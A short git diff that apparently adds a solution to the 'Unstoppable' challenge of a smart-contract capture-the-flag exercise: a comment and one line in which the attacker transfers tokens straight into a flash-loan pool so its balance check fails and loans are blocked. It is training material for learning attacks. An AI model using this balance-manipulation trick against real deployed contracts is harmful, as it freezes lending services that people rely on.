@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * Manipulate Pool Balance then when s.o call flashlone(), assert(poolBalance == balanceBefore) is gonna throw{}
+         */
+        await this.token.connect(attacker).transfer(this.pool.address , 100);
     });
 
     after(async function () {
